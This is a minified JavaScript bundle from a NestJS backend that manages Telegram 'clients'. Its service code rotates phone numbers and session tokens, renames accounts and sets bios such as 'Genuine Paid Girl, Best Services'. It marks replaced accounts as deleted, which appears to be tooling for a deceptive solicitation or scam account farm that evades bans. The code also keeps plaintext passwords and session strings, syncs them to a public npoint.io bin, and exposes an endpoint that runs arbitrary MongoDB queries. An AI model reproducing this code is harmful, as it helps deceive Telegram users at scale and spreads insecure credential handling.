Ayesha"}),r("design:type",String)],a.prototype,"title",void 0),i([(0,n.ApiProperty)({description:"Username of the channel",example:null,required:!1}),r("design:type",String)],a.prototype,"username",void 0),i([(0,n.ApiProperty)({description:"Whether the channel is private",example:!1,required:!1}),r("design:type",Boolean)],a.prototype,"private",void 0),i([(0,n.ApiProperty)({default:!1,example:!1,required:!1}),r("design:type",Boolean)],a.prototype,"forbidden",void 0)},6847:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.SearchChannelDto=void 0;const n=o(9742);class a{}t.SearchChannelDto=a,i([(0,n.ApiPropertyOptional)({description:"Unique identifier for the channel",example:"803387987"}),r("design:type",String)],a.prototype,"channelId",void 0),i([(0,n.ApiPropertyOptional)({description:"Title of the channel",example:"Earn money with Ayesha"}),r("design:type",String)],a.prototype,"title",void 0),i([(0,n.ApiPropertyOptional)({description:"privacy of the channel",example:!1}),r("design:type",String)],a.prototype,"private",void 0),i([(0,n.ApiPropertyOptional)({description:"Username of the channel",example:"ayesha_channel"}),r("design:type",String)],a.prototype,"username",void 0),i([(0,n.ApiPropertyOptional)({description:"Indicates if the channel can send messages",example:!0}),r("design:type",Boolean)],a.prototype,"canSendMsgs",void 0),i([(0,n.ApiPropertyOptional)({description:"Minimum number of participants in the channel",example:10}),r("design:type",Number)],a.prototype,"minParticipantsCount",void 0),i([(0,n.ApiPropertyOptional)({description:"Maximum number of participants in the channel",example:100}),r("design:type",Number)],a.prototype,"maxParticipantsCount",void 0)},1734:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateChannelDto=void 0;const i=o(9742),r=o(5127);class n extends((0,i.PartialType)(r.CreateChannelDto)){}t.UpdateChannelDto=n},8029:function(e,t,o){var i,r=this&&this.__createBinding||(Object.create?function(e,t,o,i){void 0===i&&(i=o);var r=Object.getOwnPropertyDescriptor(t,o);r&&!("get"in r?!t.__esModule:r.writable||r.configurable)||(r={enumerable:!0,get:function(){return t[o]}}),Object.defineProperty(e,i,r)}:function(e,t,o,i){void 0===i&&(i=o),e[i]=t[o]}),n=this&&this.__setModuleDefault||(Object.create?function(e,t){Object.defineProperty(e,"default",{enumerable:!0,value:t})}:function(e,t){e.default=t}),a=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},s=this&&this.__importStar||(i=function(e){return i=Object.getOwnPropertyNames||function(e){var t=[];for(var o in e)Object.prototype.hasOwnProperty.call(e,o)&&(t[t.length]=o);return t},i(e)},function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var o=i(e),a=0;a<o.length;a++)"default"!==o[a]&&r(t,e,o[a]);return n(t,e),t}),c=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.ChannelSchema=t.Channel=void 0;const l=o(5839),p=s(o(6037));let d=class{};t.Channel=d,a([(0,l.Prop)({required:!0,unique:!0}),c("design:type",String)],d.prototype,"channelId",void 0),a([(0,l.Prop)({default:!1}),c("design:type",Boolean)],d.prototype,"broadcast",void 0),a([(0,l.Prop)({default:!0}),c("design:type",Boolean)],d.prototype,"canSendMsgs",void 0),a([(0,l.Prop)({type:p.Schema.Types.Number,default:0}),c("design:type",Number)],d.prototype,"participantsCount",void 0),a([(0,l.Prop)({default:!1}),c("design:type",Boolean)],d.prototype,"restricted",void 0),a([(0,l.Prop)({default:!1}),c("design:type",Boolean)],d.prototype,"sendMessages",void 0),a([(0,l.Prop)({required:!0}),c("design:type",String)],d.prototype,"title",void 0),a([(0,l.Prop)({required:!1,default:null}),c("design:type",String)],d.prototype,"username",void 0),a([(0,l.Prop)({required:!0,default:!1}),c("design:type",Boolean)],d.prototype,"private",void 0),a([(0,l.Prop)({default:!1,required:!1}),c("design:type",Boolean)],d.prototype,"forbidden",void 0),t.Channel=d=a([(0,l.Schema)({collection:"channels",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],d),t.ChannelSchema=l.SchemaFactory.createForClass(d)},3209:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ClientController=void 0;const a=o(3563),s=o(9742),c=o(5562),l=o(9815),p=o(1167),d=o(7908);let u=class{constructor(e){this.clientService=e}async create(e){try{return await this.clientService.create(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.BAD_REQUEST)}}async search(e){try{return await this.clientService.search(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.BAD_REQUEST)}}async updateClient(e){return this.clientService.updateClient(e),"Update client initiated"}async findAllMasked(e){try{return await this.clientService.findAllMasked(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.INTERNAL_SERVER_ERROR)}}async findAll(){try{return await this.clientService.findAll()}catch(e){throw new a.HttpException(e.message,a.HttpStatus.INTERNAL_SERVER_ERROR)}}async findOne(e){try{return await this.clientService.findOne(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}async update(e,t){try{return await this.clientService.update(e,t)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}async remove(e){try{return await this.clientService.remove(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}async executeQuery(e){const{query:t,sort:o,limit:i,skip:r}=e;try{return await this.clientService.executeQuery(t,o,i,r)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.BAD_REQUEST)}}async addPromoteMobile(e,t){try{return await this.clientService.addPromoteMobile(e,t)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}async removePromoteMobile(e,t){try{return await this.clientService.removePromoteMobile(e,t)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}};t.ClientController=u,i([(0,a.Post)(),(0,s.ApiOperation)({summary:"Create user data"}),(0,s.ApiResponse)({status:201,description:"The user data has been successfully created."}),(0,s.ApiResponse)({status:400,description:"Invalid input data."}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[l.CreateClientDto]),r("design:returntype",Promise)],u.prototype,"create",null),i([(0,a.Get)("search"),(0,s.ApiOperation)({summary:"Search user data"}),(0,s.ApiResponse)({status:200,description:"Matching user data returned successfully."}),n(0,(0,a.Query)()),r("design:type",Function),r("design:paramtypes",[p.SearchClientDto]),r("design:returntype",Promise)],u.prototype,"search",null),i([(0,a.Get)("updateClient/:clientId"),(0,s.ApiOperation)({summary:"Get user data by ID"}),n(0,(0,a.Param)("clientId")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],u.prototype,"updateClient",null),i([(0,a.Get)("maskedCls"),(0,s.ApiOperation)({summary:"Get all user data with masked fields"}),(0,s.ApiResponse)({status:200,description:"All user data returned successfully."}),n(0,(0,a.Query)()),r("design:type",Function),r("design:paramtypes",[p.SearchClientDto]),r("design:returntype",Promise)],u.prototype,"findAllMasked",null),i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get all user data"}),(0,s.ApiResponse)({status:200,description:"All user data returned successfully."}),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],u.prototype,"findAll",null),i([(0,a.Get)(":clientId"),(0,s.ApiOperation)({summary:"Get user data by ID"}),(0,s.ApiResponse)({status:200,description:"User data returned successfully."}),(0,s.ApiResponse)({status:404,description:"User data not found."}),n(0,(0,a.Param)("clientId")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],u.prototype,"findOne",null),i([(0,a.Patch)(":clientId"),(0,s.ApiOperation)({summary:"Update user data by ID"}),(0,s.ApiResponse)({status:200,description:"The user data has been successfully updated."}),(0,s.ApiResponse)({status:404,description:"User data not found."}),n(0,(0,a.Param)("clientId")),n(1,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[String,d.UpdateClientDto]),r("design:returntype",Promise)],u.prototype,"update",null),i([(0,a.Delete)(":clientId"),(0,s.ApiOperation)({summary:"Delete user data by ID"}),(0,s.ApiResponse)({status:200,description:"The user data has been successfully deleted."}),(0,s.ApiResponse)({status:404,description:"User data not found."}),n(0,(0,a.Param)("clientId")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],u.prototype,"remove",null),i([(0,a.Post)("query"),(0,s.ApiOperation)({summary:"Execute a custom MongoDB query"}),(0,s.ApiResponse)({status:200,description:"Query executed successfully."}),(0,s.ApiResponse)({status:400,description:"Invalid query."}),(0,s.ApiBody)({schema:{properties:{query:{type:"object"},sort:{type:"object"},limit:{type:"number"},skip:{type:"number"}}}}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[Object]),r("design:returntype",Promise)],u.prototype,"executeQuery",null),i([(0,a.Patch)(":clientId/promoteMobile/add"),(0,s.ApiOperation)({summary:"Add a mobile number to the promoteMobile array for a specific client"}),(0,s.ApiParam)({name:"clientId",description:"The unique identifier of the client"}),(0,s.ApiBody)({schema:{properties:{mobileNumber:{type:"string",example:"916265240911"}}}}),(0,s.ApiResponse)({status:200,description:"Mobile number added successfully."}),(0,s.ApiResponse)({status:404,description:"Client not found."}),n(0,(0,a.Param)("clientId")),n(1,(0,a.Body)("mobileNumber")),r("design:type",Function),r("design:paramtypes",[String,String]),r("design:returntype",Promise)],u.prototype,"addPromoteMobile",null),i([(0,a.Patch)(":clientId/promoteMobile/remove"),(0,s.ApiOperation)({summary:"Remove a mobile number from the promoteMobile array for a specific client"}),(0,s.ApiParam)({name:"clientId",description:"The unique identifier of the client"}),(0,s.ApiBody)({schema:{properties:{mobileNumber:{type:"string",example:"916265240911"}}}}),(0,s.ApiResponse)({status:200,description:"Mobile number removed successfully."}),(0,s.ApiResponse)({status:404,description:"Client not found."}),n(0,(0,a.Param)("clientId")),n(1,(0,a.Body)("mobileNumber")),r("design:type",Function),r("design:paramtypes",[String,String]),r("design:returntype",Promise)],u.prototype,"removePromoteMobile",null),t.ClientController=u=i([(0,s.ApiTags)("Clients"),(0,a.Controller)("clients"),r("design:paramtypes",[c.ClientService])],u)},8009:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.ClientModule=void 0;const r=o(3563),n=o(5839),a=o(1013),s=o(5562),c=o(3209),l=o(282),p=o(8421),d=o(7422),u=o(6061),f=o(5774),y=o(889);let m=class{};t.ClientModule=m,t.ClientModule=m=i([(0,r.Module)({imports:[f.initModule,n.MongooseModule.forFeature([{name:a.Client.name,schema:a.ClientSchema}]),(0,r.forwardRef)((()=>l.TelegramModule)),(0,r.forwardRef)((()=>p.BufferClientModule)),(0,r.forwardRef)((()=>d.UsersModule)),(0,r.forwardRef)((()=>u.ArchivedClientModule)),y.NpointModule],controllers:[c.ClientController],providers:[s.ClientService],exports:[s.ClientService]})],m)},5562:function(e,t,o){var i,r=this&&this.__createBinding||(Object.create?function(e,t,o,i){void 0===i&&(i=o);var r=Object.getOwnPropertyDescriptor(t,o);r&&!("get"in r?!t.__esModule:r.writable||r.configurable)||(r={enumerable:!0,get:function(){return t[o]}}),Object.defineProperty(e,i,r)}:function(e,t,o,i){void 0===i&&(i=o),e[i]=t[o]}),n=this&&this.__setModuleDefault||(Object.create?function(e,t){Object.defineProperty(e,"default",{enumerable:!0,value:t})}:function(e,t){e.default=t}),a=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},s=this&&this.__importStar||(i=function(e){return i=Object.getOwnPropertyNames||function(e){var t=[];for(var o in e)Object.prototype.hasOwnProperty.call(e,o)&&(t[t.length]=o);return t},i(e)},function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var o=i(e),a=0;a<o.length;a++)"default"!==o[a]&&r(t,e,o[a]);return n(t,e),t}),c=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},l=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}},p=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.ClientService=void 0;const d=o(2995),u=o(3563),f=o(5839),y=o(6037),m=o(1013),h=o(4374),g=o(7385),v=o(9127),w=o(9646),b=o(6185),P=s(o(6928)),S=o(6790),C=o(6954),A=p(o(8938));let O=Date.now()-25e4,M=class{constructor(e,t,o,i,r,n){this.clientModel=e,this.telegramService=t,this.bufferClientService=o,this.usersService=i,this.archivedClientService=r,this.npointSerive=n,this.clientsMap=new Map,setInterval((async()=>{await this.refreshMap()}),3e5)}async checkNpoint(){const e=(await A.default.get("https://api.npoint.io/7c2682f37bb93ef486ba")).data;for(const t in e){const o=await this.findOne(t,!1);if((0,b.areJsonsNotSame)(o,e[t])){await this.findAll();const e=(0,b.mapToJson)(this.clientsMap);await this.npointSerive.updateDocument("7c2682f37bb93ef486ba",e);const t={};for(const o in e){const{session:i,mobile:r,password:n,promoteMobile:a,...s}=e[o];t[o]=s}await this.npointSerive.updateDocument("f0d1e44d82893490bbde",t);break}}}async create(e){return new this.clientModel(e).save()}async findAll(){if(this.clientsMap.size<20){const e=await this.clientModel.find({},{_id:0,updatedAt:0}).lean();for(const t of e)this.clientsMap.set(t.clientId,t);return console.log("Refreshed Clients"),e}return Array.from(this.clientsMap.values())}async findAllMasked(e){const t=await this.findAll();return(e?t.filter((t=>Object.keys(e).every((o=>t[o]===e[o])))):t).map((e=>{const{session:t,mobile:o,password:i,promoteMobile:r,...n}=e;return n}))}async refreshMap(){console.log("Refreshed Clients"),this.clientsMap.clear()}async findOne(e,t=!0){const o=this.clientsMap.get(e);if(o)return o;{const o=(await this.clientModel.findOne({clientId:e},{_id:0,updatedAt:0}).exec())?.toJSON();if(this.clientsMap.set(e,o),!o&&t)throw new u.NotFoundException(`Client with ID "${e}" not found`);return o}}async update(e,t){delete t._id,t._doc&&delete t._doc._id,await(0,b.fetchWithTimeout)(`${(0,b.ppplbot)()}&text=Updating the Existing client: ${e}`);const o=await this.clientModel.findOneAndUpdate({clientId:e},{$set:t},{new:!0,upsert:!0}).exec();if(!o)throw new u.NotFoundException(`Client with ID "${e}" not found`);return this.clientsMap.set(e,o),await(0,b.fetchWithTimeout)(`${process.env.uptimeChecker}/refreshmap`),await(0,b.fetchWithTimeout)(`${process.env.uptimebot}/refreshmap`),console.log("Refreshed Maps"),o}async remove(e){const t=await this.clientModel.findOneAndDelete({clientId:e}).exec();if(!t)throw new u.NotFoundException(`Client with ID "${e}" not found`);return t}async search(e){return console.log(e),e.firstName&&(e.firstName={$regex:new RegExp(e.firstName,"i")}),console.log(e),this.clientModel.find(e).exec()}async setupClient(e,t){if(console.log(`Received New Client Request for - ${e}`),(0,b.toBoolean)(process.env.AUTO_CLIENT_SETUP)&&Date.now()>O+24e4){O=Date.now();const o=await this.findOne(e),i=o.mobile;await(0,b.fetchWithTimeout)(`${(0,b.ppplbot)()}&text=Received New Client Request for - ${e} - OldNumber: ${o.mobile} || ${o.username}`),console.log(t),await this.telegramService.disconnectAll();const r={availableDate:{$lte:new Date(Date.now()).toISOString().split("T")[0]},channels:{$gt:200}},n=(await this.bufferClientService.executeQuery(r,{tgId:1}))[0];try{if(n){this.telegramService.setActiveClientSetup({...t,clientId:e,existingMobile:i,newMobile:n.mobile}),await this.telegramService.createClient(n.mobile);const o=await this.telegramService.createNewSession(n.mobile);await this.telegramService.deleteClient(n.mobile),await this.updateClientSession(o)}else await(0,b.fetchWithTimeout)(`${(0,b.ppplbot)()}&text=Buffer Clients not available`),console.log("Buffer Clients not available")}catch(e){(0,b.parseError)(e),await this.telegramService.deleteClient(n.mobile),console.log("Removing buffer as error");const t=new Date(Date.now()+2592e5).toISOString().split("T")[0];await this.bufferClientService.createOrUpdate(n.mobile,{availableDate:t}),this.telegramService.setActiveClientSetup(void 0)}}else console.log("Profile Setup Recently tried, wait ::",O-Date.now())}async updateClientSession(e){try{const t=this.telegramService.getActiveClientSetup(),{days:o,archiveOld:i,clientId:r,existingMobile:n,formalities:a,newMobile:s}=t;let c;await this.telegramService.disconnectAll(),await(0,g.sleep)(2e3),await this.telegramService.createClient(s,!1,!0);const l=(r?.match(/[a-zA-Z]+/g)).toString();let p=`${l[0].toUpperCase()+l.slice(1)}_Red`+(0,b.fetchNumbersFromString)(r);c=await this.telegramService.updateUsername(s,p),await(0,b.fetchWithTimeout)(`${(0,b.ppplbot)()}&text=Updated username for NewNumber:${s} || ${c}`),await this.telegramService.deleteClient(s);const d=(await this.usersService.search({mobile:n}))[0],u=await this.findOne(r);this.update(r,{mobile:s,username:c,session:e}),await(0,b.fetchWithTimeout)(u.deployKey,{},1),await this.bufferClientService.remove(s),setTimeout((async()=>{await this.updateClient(r)}),1e4);try{if(d)try{if((0,b.toBoolean)(a)?(await this.telegramService.createClient(n,!1,!0),console.log("Started Formalities"),await this.telegramService.updateNameandBio(n,"Deleted Account",`New Acc: @${c}`),await this.telegramService.deleteProfilePhotos(n),await this.telegramService.updateUsername(n,""),await this.telegramService.updatePrivacyforDeletedAccount(n),console.log("Formalities finished"),await this.telegramService.deleteClient(n),await(0,b.fetchWithTimeout)(`${(0,b.ppplbot)()}&text=Formalities finished`)):console.log("Formalities skipped"),i){const e={mobile:n,availableDate:new Date(Date.now()+24*(o+1)*60*60*1e3).toISOString().split("T")[0],session:d.session,tgId:d.tgId,channels:170},t=await this.bufferClientService.createOrUpdate(n,e);console.log("client Archived: ",t),await(0,b.fetchWithTimeout)(`${(0,b.ppplbot)()}&text=Client Archived`)}else console.log("Client Archive Skipped"),await(0,b.fetchWithTimeout)(`${(0,b.ppplbot)()}&text=Client Archive Skipped`)}catch(e){console.log("Cannot Archive Old Client");const t=(0,b.parseError)(e);(0,b.contains)(t.message.toLowerCase(),["expired","unregistered","deactivated","session_revoked","user_deactivated_ban"])?(console.log("Deleting User: ",d.mobile),await this.bufferClientService.remove(d.mobile),await this.archivedClientService.remove(d.mobile)):console.log("Not Deleting user")}}catch(e){(0,b.parseError)(e)}this.telegramService.setActiveClientSetup(void 0),console.log("Update finished Exitting Exiiting TG Service"),await(0,b.fetchWithTimeout)(`${(0,b.ppplbot)()}&text=Update finished`),await this.telegramService.disconnectAll()}catch(e){(0,b.parseError)(e),this.telegramService.setActiveClientSetup(void 0)}}async updateClient(e){const t=await this.findOne(e);try{await S.CloudinaryService.getInstance(t?.dbcoll?.toLowerCase());const o=await this.telegramService.createClient(t.mobile,!0,!1);await(0,g.sleep)(2e3);const i=await o.getMe();if(i.username!==t.username||!i.username.toLowerCase().startsWith(i.firstName.split(" ")[0].toLowerCase())){const i=(e?.match(/[a-zA-Z]+/g)).toString();let r=`${i[0].toUpperCase()+i.slice(1)}_Red`+(0,b.fetchNumbersFromString)(e);const n=await o.updateUsername(r);await this.update(t.clientId,{username:n})}await(0,g.sleep)(2e3),i.firstName!==t.name&&await o.updateProfile(t.name,"Genuine Paid Girl, Best Services"),await(0,g.sleep)(3e3),await o.deleteProfilePhotos(),await(0,g.sleep)(3e3),await o.updatePrivacy(),await(0,g.sleep)(3e3);const r=process.cwd();await o.updateProfilePic(P.join(r,"dp1.jpg")),await(0,g.sleep)(3e3),await o.updateProfilePic(P.join(r,"dp2.jpg")),await(0,g.sleep)(3e3),await o.updateProfilePic(P.join(r,"dp3.jpg")),await(0,g.sleep)(2e3),await this.telegramService.deleteClient(t.mobile)}catch(e){(0,b.parseError)(e)}}async updateClients(){const e=await this.findAll();for(const t of e)await this.updateClient(t.clientId)}async generateNewSession(e,t=1){try{console.log("String Generation started"),await(0,b.fetchWithTimeout)(`${(0,b.ppplbot)()}&text=String Generation started for NewNumber:${e}`),await(0,g.sleep)(1e3);const o=await(0,b.fetchWithTimeout)(`${process.env.uptimebot}/login?phone=${e}&force=true`,{timeout:15e3},1);o?(console.log("Code Sent successfully",o.data),await(0,b.fetchWithTimeout)(`${(0,b.ppplbot)()}&text=Code Sent successfully`),await this.bufferClientService.update(e,{availableDate:new Date(Date.now()+864e5).toISOString().split("T")[0]})):(await(0,b.fetchWithTimeout)(`${(0,b.ppplbot)()}&text=Failed to send Code`),console.log("Failed to send Code",o),t<2&&(await(0,g.sleep)(8e3),await this.generateNewSession(e,t+1)))}catch(o){console.log(o),t<2&&(await(0,g.sleep)(8e3),await this.generateNewSession(e,t+1))}}async executeQuery(e,t,o,i){try{if(!e)throw new u.BadRequestException("Query is invalid.");const r=this.clientModel.find(e);return t&&r.sort(t),o&&r.limit(o),i&&r.skip(i),await r.exec()}catch(e){throw new u.InternalServerErrorException(e.message)}}async addPromoteMobile(e,t){return this.clientModel.findOneAndUpdate({clientId:e},{$addToSet:{promoteMobile:t}},{new:!0}).exec()}async removePromoteMobile(e,t){return this.clientModel.findOneAndUpdate({clientId:e},{$pull:{promoteMobile:t}},{new:!0}).exec()}};t.ClientService=M,t.ClientService=M=a([(0,u.Injectable)(),l(0,(0,f.InjectModel)(m.Client.name)),l(1,(0,u.Inject)((0,u.forwardRef)((()=>d.TelegramService)))),l(2,(0,u.Inject)((0,u.forwardRef)((()=>h.BufferClientService)))),l(3,(0,u.Inject)((0,u.forwardRef)((()=>v.UsersService)))),l(4,(0,u.Inject)((0,u.forwardRef)((()=>w.ArchivedClientService)))),c("design:paramtypes",[y.Model,d.TelegramService,h.BufferClientService,v.UsersService,w.ArchivedClientService,C.NpointService])],M)},9815:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateClientDto=void 0;const n=o(9742);class a{}t.CreateClientDto=a,i([(0,n.ApiProperty)({example:"paid_giirl_shruthiee",description:"Channel link of the user"}),r("design:type",String)],a.prototype,"channelLink",void 0),i([(0,n.ApiProperty)({example:"shruthi",description:"Database collection name"}),r("design:type",String)],a.prototype,"dbcoll",void 0),i([(0,n.ApiProperty)({example:"PaidGirl.netlify.app/Shruthi1",description:"Link of the user"}),r("design:type",String)],a.prototype,"link",void 0),i([(0,n.ApiProperty)({example:"Shruthi Reddy",description:"Name of the user"}),r("design:type",String)],a.prototype,"name",void 0),i([(0,n.ApiProperty)({example:"+916265240911",description:"Phone number of the user"}),r("design:type",String)],a.prototype,"mobile",void 0),i([(0,n.ApiProperty)({example:"Ajtdmwajt1@",description:"Password of the user"}),r("design:type",String)],a.prototype,"password",void 0),i([(0,n.ApiProperty)({example:"https://shruthi1.glitch.me",description:"Repl link of the user"}),r("design:type",String)],a.prototype,"repl",void 0),i([(0,n.ApiProperty)({example:"https://shruthiprom0101.glitch.me",description:"Promotion Repl link of the user"}),r("design:type",String)],a.prototype,"promoteRepl",void 0),i([(0,n.ApiProperty)({example:"1BQANOTEuMTA4LjUg==",description:"Session token"}),r("design:type",String)],a.prototype,"session",void 0),i([(0,n.ApiProperty)({example:"ShruthiRedd2",description:"Username of the user"}),r("design:type",String)],a.prototype,"username",void 0),i([(0,n.ApiProperty)({example:"shruthi1",description:"Client ID of the user"}),r("design:type",String)],a.prototype,"clientId",void 0),i([(0,n.ApiProperty)({example:"https://shruthi1.glitch.me/exit",description:"Deployment key URL"}),r("design:type",String)],a.prototype,"deployKey",void 0),i([(0,n.ApiProperty)({example:"ShruthiRedd2",description:"Main account of the user"}),r("design:type",String)],a.prototype,"mainAccount",void 0),i([(0,n.ApiProperty)({example:"booklet_10",description:"Product associated with the user"}),r("design:type",String)],a.prototype,"product",void 0),i([(0,n.ApiProperty)({example:["916265240911"],description:"Promote mobile number of the user",required:!1,type:[String]}),r("design:type",Array)],a.prototype,"promoteMobile",void 0)},1167:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.SearchClientDto=void 0;const n=o(9742),a=o(4922),s=o(7403);class c{}t.SearchClientDto=c,i([(0,n.ApiPropertyOptional)({description:"Client ID of the client"}),(0,a.Transform)((({value:e})=>e?.trim().toLowerCase())),(0,s.IsOptional)(),(0,s.IsString)(),(0,s.Matches)(/^[a-z0-9_-]{3,50}$/i,{message:"Invalid client ID format"}),r("design:type",String)],c.prototype,"clientId",void 0),i([(0,n.ApiPropertyOptional)({description:"Database collection name"}),(0,a.Transform)((({value:e})=>e?.trim().toLowerCase())),(0,s.IsOptional)(),(0,s.IsString)(),r("design:type",String)],c.prototype,"dbcoll",void 0),i([(0,n.ApiPropertyOptional)({description:"Channel link of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsString)(),r("design:type",String)],c.prototype,"channelLink",void 0),i([(0,n.ApiPropertyOptional)({description:"Link of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsUrl)({},{message:"Invalid URL format"}),r("design:type",String)],c.prototype,"link",void 0),i([(0,n.ApiPropertyOptional)({description:"Name of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsString)(),r("design:type",String)],c.prototype,"name",void 0),i([(0,n.ApiPropertyOptional)({description:"Phone number of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.Matches)(/^\+?[0-9]{10,15}$/,{message:"Invalid phone number format"}),r("design:type",String)],c.prototype,"number",void 0),i([(0,n.ApiPropertyOptional)({description:"Password of the client"}),(0,s.IsOptional)(),(0,s.IsString)(),r("design:type",String)],c.prototype,"password",void 0),i([(0,n.ApiPropertyOptional)({description:"Repl link of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsUrl)({},{message:"Invalid URL format"}),r("design:type",String)],c.prototype,"repl",void 0),i([(0,n.ApiPropertyOptional)({description:"Promotion Repl link of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsUrl)({},{message:"Invalid URL format"}),r("design:type",String)],c.prototype,"promoteRepl",void 0),i([(0,n.ApiPropertyOptional)({description:"Clientname of the client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsString)(),r("design:type",String)],c.prototype,"clientName",void 0),i([(0,n.ApiPropertyOptional)({description:"Deployment key URL"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsUrl)({},{message:"Invalid URL format"}),r("design:type",String)],c.prototype,"deployKey",void 0),i([(0,n.ApiPropertyOptional)({description:"Main account of the client"}),(0,a.Transform)((({value:e})=>e?.trim().toLowerCase())),(0,s.IsOptional)(),(0,s.IsString)(),r("design:type",String)],c.prototype,"mainAccount",void 0),i([(0,n.ApiPropertyOptional)({description:"Product associated with the 